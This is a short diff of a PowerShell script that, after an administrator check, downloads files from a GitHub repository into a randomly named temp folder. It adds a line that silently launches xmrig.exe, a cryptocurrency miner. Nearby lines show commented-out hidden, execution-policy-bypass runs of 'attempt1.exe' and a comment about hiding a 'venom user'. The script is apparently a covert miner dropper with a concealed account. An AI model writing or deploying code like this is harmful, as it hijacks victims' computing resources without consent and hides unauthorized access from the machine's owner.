@@ -23,7 +23,7 @@ if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
 ## variables
 $wd = random_text
 $path = "$env:temp/$wd"
-$rig = $path/$wd
+
 $initial_dir = Get-Location
 
 
@@ -64,7 +64,7 @@ Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs
 
 #powershell powershell.exe -windowstyle hidden -ep bypass ./attempt1.exe
 
-
+#Create Folder within Folder
 New-Item -Name "$wd" -Path "$path" -ItemType Directory
 echo $wd
 cd $wd
@@ -85,6 +85,7 @@ pause
 #.\attempt1.exe; ./calty2
     # Install the attempt1.exe file
 #powershell Start-Process -FilePath $path .\attempt1.exe -ArgumentList "/silent" -Wait
+powershell Start-Process -Wait -FilePath '$path/$wd/.\xmrig.exe' -ArgumentList '/s /v/qn' -PassThru
 
 # hide venom user
 
